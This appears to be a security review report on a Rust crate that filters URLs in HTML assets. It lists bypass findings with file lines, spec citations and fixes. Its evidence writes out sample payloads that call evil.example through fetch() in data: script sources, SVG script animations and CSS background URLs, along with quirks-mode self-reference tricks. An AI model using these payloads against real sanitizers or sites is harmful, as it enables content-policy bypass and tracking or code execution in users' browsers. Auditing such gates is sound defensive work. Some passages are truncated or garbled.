new_findings.kind: security (asset gate reports a script payload Inline; R11-P1 lead rule 'never reported Inline and ignored'; R5/R6 class: the crate reads the payload differently from the browser - as CSS instead of as a classic script)
new_findings.file_line: handshake-studio-assets/crates/hsk-studio-web/src/datauri.rs:530-534 (decide returns Decision::ScanCss for essence text/css BEFORE matching the load context, so the Load::Script arm :544-551 never sees text/css); reached from src/assets.rs:457-474 -> data_css :483-529, which pushes AssetOutcome::Inline at :520-527 and then scans the JavaScript as CSS; carriers rows src/carriers.rs:357-365 (script src, Load::Script) and :583-591 (svg script href/xlink:href, Load::Script). Pinned wrong by src/datauri/tests.rs:173-184 (Load::Script inside the 'CSS is scanned everywhere' loop).
new_findings.evidence: Fetch 2.10 'should response to request be blocked due to its MIME type?' blocks script-like destinations only for audio/*, image/*, video/* and text/csv; HTML 'fetch a classic script' says 'For historical reasons, this algorithm does not include MIME type checking' (both fetched 2026-10-11). So <script src="data:text/css,fetch('https://evil.example/x')"></script> (also ;charset=utf-8, ;base64, TEXT/CSS, data:, and <svg><script href=...>) executes the payload as a classic script, which fetches any URL. The crate: decide(Load::Script, text/css) = ScanCss -> one AssetRef {reference: the data: URL, outcome: Inline, data_depth 0}; the CSS scan of the JS finds nothing (fetch( is an ordinary function, its string is not in a URL function). The same crate denies the identical payload typed text/plain (datauri/tests.rs:239 'Scripts execute everything except the types Fetch blocks for scripts'), and its own DESCRIPTOR data_urls.policy (lib.rs:46) states both 'text/css: scanned recursively in every carrier' and 'scripts only for image/audio/video/text/csv; every other type ... Denied(inline_document)'; the assets.classes definition of Inline ('data: payload that loads nothing further in its carrier, or a CSS payload ...') is falsified (V4-07). Browser execution UNVERIFIED in a running browser (spec-derived, the same standard the crate's own Script policy uses). Invisible to the difftest by construction: css_reference.rs:723-724 copies the 'text/css or (import && inert)' policy and has no script carrier.
new_findings.remediation: In datauri::decide, match the load context first: Load::Script -> text/css is Deny (only image/*, audio/*, video/*, text/csv stay Inline); also Load::Track -> Deny for text/css (R12-P1). Keep ScanCss for text/css in Stylesheet, Resource, Document, Image, Media, Beacon/None/Base. Fix the unit test loop (datauri/tests.rs:176-184) and add V4-08 gate tests: <script src=data:text/css,fetch(...)> and <svg><script href=...> denied, with case (DATA:Text/CSS;Charset=UTF-8), escape (data:, base64 body) and decoy (a CSS-looking payload 'a{b:url(x)}//' that is also JS) variants; update DESCRIPTOR data_urls.policy so the two rows no longer contradict.

new_findings.evidence:
HTML links.html, stylesheet link type: 'Quirk: If the document has been set to quirks mode, has the same origin as the URL of the external resource, and the Content-Type metadata of the external resource is not a supported style sheet type, the user agent must instead assume it to be text/css.' CSS Cascade 5 2.3 says the same for @import. (or href=" ": not the empty string, the URL parser strips the spaces and resolves to the document URL) fetches the document itself, same origin, and in a quirks-mode document (no doctype; the crate does not track the mode and already assumes quirks for data: payloads, datauri.rs:20-21) parses the HTML source as CSS. Payload: '

{}*{background:url(https://evil.example/p.png)}

' - as CSS the markup before '{}' is one invalid rule, then '*{background:url(https://evil.example/p.png)}' is a valid rule and the image loads. The crate reports href '#' as SameDocument (port never asked) and the

text is never CSS-scanned, so https://evil.example/p.png is neither reported nor denied; with href=" " not even the link is reported. Same with (string '#', import, classify -> SameDocument). Script variant: HTML 'fetch a classic script' has no MIME check, so
new_findings.remediation: In Collector::reference/decide (or before classify in attribute()), when the carrier's load context is Load::Stylesheet or Load::Script (and Load::Track, see R12-P1), a reference that resolves to the document itself - empty after the URL parser's C0-control-or-space strip and tab/newline removal, or starting with '#' after it - is Denied (InlineDocument or NotGranted), never SameDocument or skipped; keep SameDocument for all other carriers ('#' links and in-document SVG references are common and correct). Note the over-denial of <link rel=icon href="#"> (every link href is Load::Stylesheet): harmless Denied row. Tests (V4-08): link href '#', '#x', ' ', ' ', '\t#'; @import '#', url(#), url( "#" ); script src '#' and ' ', svg script href '#'; case/whitespace variants; contrast: a href '#', iframe src '#', use href '#x' stay SameDocument.

new_findings.kind: security, low impact (the crate reads a URL value differently from the URL parser before deciding: Unicode White_Space trim vs C0-control-or-space strip)
new_findings.file_line: handshake-studio-assets/crates/hsk-studio-web/src/assets.rs:603 (if !text.trim().is_empty()) for Path::Url and animation URL targets, :653 (refresh URL .trim().is_empty()); unchanged since 5518980c (05:49Z, after the V4 adoption) and present at the R7 PASS commit 08ad0ad.
new_findings.evidence: Rust str::trim removes Unicode White_Space (U+0085, U+00A0, U+1680, U+2000-200A, U+2028/2029, U+202F, U+205F, U+3000). The URL Standard's basic URL parser removes only leading/trailing C0 control or space; HTML img/script/link/iframe only skip the literally empty string. So ,
new_findings.remediation: Replace the emptiness pre-checks with the URL parser's strip (trim_matches(|c| c <= ' ') after removing tab/LF/CR) - classify() already uses it (assets.rs:145-148); combine with R12-F2 (a value empty after that strip is a self-reference: skip for document/image carriers, deny for style sheet/script carriers). Test: NBSP, U+3000 and U+2028 values on img src, link href and a refresh URL reach the port as relative references (or are denied), never vanish.

new_findings.kind: security (load context too permissive for two more carriers; same root cause as R12-F1)
new_findings.file_line: handshake-studio-assets/crates/hsk-studio-web/src/datauri.rs:532-534 with :552-559 (Load::Track: text/css reaches ScanCss before the track arm, although the crate denies text/plain there because 'no text type can become WebVTT', datauri/tests.rs:246-247); src/assets.rs:806-810 (every animation URL target gets Load::Resource regardless of the animated element).
new_findings.evidence: (1) <track src="data:text/css,WEBVTT /*%0A%0ASTYLE%0A::cue{background:url(https://evil.example/p.png)}"> - as CSS the '/*' on the header line comments out the STYLE block, so the scan finds nothing and reports Inline; a WebVTT parser reads the STYLE block, whose ::cue background loads. Whether engines accept a non-text/vtt type for tracks, and load ::cue background images, is UNVERIFIED (not fetched); the crate's own track policy assumes text types can become WebVTT. (2) <svg><script><set attributeName="href" to="data:text/plain,fetch('https://evil.example/x')"/></script></svg>: the URL target is decided with Load::Resource, where text/plain is inert -> Inline; if an engine prepares a not-yet-started SVG script when its animated href changes, the payload executes (UNVERIFIED engine behaviour; Load::Script would deny it).
new_findings.remediation: Covered by the R12-F1 change for tracks (text/css -> Deny under Load::Track). For animation URL targets, take the load context of the animated element's href row (target = parent or href target; at least: script parent -> Load::Script, use -> Resource, image/feImage -> Image) or use the intersection of Script and Resource (Inline only for non-XML image/*, non-playlist audio/video).

new_findings.kind: security (engine-only URL carriers outside the spec indices the lead named; the lead rejected documented limitations twice: R10-P1, R11-P1)
new_findings.file_line: handshake-studio-assets/crates/hsk-studio-web/src/carriers.rs:301-808 (no rows for mglyph src, param value, meta http-equiv=Link; object codebase is Path::Url/Load::None at :501-509, not a base); src/lib.rs:46 DESCRIPTOR assets.not_scanned 'object param values'.
new_findings.evidence: All engine statements UNVERIFIED (engine sources not fetched under this pre-review's spec-only rule; recalled, not read): (a) MathML 3 3.2.1.2 defines mglyph src as the image URI ('src URI required', verified); mglyph is not in MathML Core (verified: 0 occurrences); Gecko is believed to still render mglyph images -> <math><mglyph src="https://evil.example/p.png"/></math> would load with no row. (b) Gecko's object loading content is believed to resolve object data / embed src against the codebase attribute -> <object codebase="../private/" data="m.png"> would load ../private/m.png while the port granted 'm.png' (a base re-target like base href, which the crate denies). (c) Blink is believed to take an object's URL from <param name=src|movie|code|url> when data is absent and a plugin type (the PDF viewer) handles it; the DESCRIPTOR lists 'object param values' as not scanned. (d) Gecko historically processed <meta http-equiv=Link> (possibly removed).
new_findings.remediation: Lead decision. Cheap fail-closed rows: mglyph src -> Path::Url, Load::Image; object/embed with a codebase attribute -> treat codebase as Path::Base (or deny that element's relative data/src); param value when name is src/movie/code/url/data/filename (ASCII case-insensitive) -> Path::Url, Load::Document; meta http-equiv=link content -> report its <...> URL refs (or deny). Or record them as lead-accepted residuals with the engine evidence.

new_findings.kind: over-scan that can refuse a legitimate document (brief item d)
new_findings.file_line: handshake-studio-assets/crates/hsk-studio-web/src/carriers.rs:312-320 (link href is Load::Stylesheet for every rel) with src/datauri.rs:537-543 (Stylesheet: inert types -> ScanCss) and src/assets.rs:545-548 (a CSS nesting overflow inside a payload refuses the whole collect_assets with limit_depth).
new_findings.evidence: <link rel=icon href="data:image/png;base64,..."> and <link rel=preload as=font href="data:font/woff2;base64,..."> are decoded and tokenized as CSS (quirks reading meant for rel=stylesheet). Random binary contains '(' '[' '{' far more often than the matching innermost closer, so nesting grows with payload size; estimated (not executed) a few hundred KB of binary can pass MAX_NESTING=1024 and refuse the whole document typed, and smaller payloads can add garbage rows. Data: favicons are usually small, so the real-world rate is low. Browsers load these as images/fonts, not CSS.
new_findings.remediation: Choose the link load context by rel (stylesheet/alternate stylesheet -> Stylesheet; icon, apple-touch-icon, preload as=image -> Image; preload as=font -> Resource; else Document), or make a LimitExceeded inside a data: payload deny that one reference (Denied(InlineDocument)) instead of refusing the document; lead-accepted 'scan or deny' allows either.

But two CONFIRMED URL-hiding holes of the R5/R6/R11-P1 class sit in the new load-context policy: data:text/css in a script carrier is reported Inline while it executes as a classic script (R12-F1, contradicting the crate's own Script policy and DESCRIPTOR), and a self-reference ('#' or whitespace) from a style sheet or script carrier is SameDocument/skipped while a quirks-mode browser reads the document itself as CSS (or runs it as script), loading URLs from plain text (R12-F2).
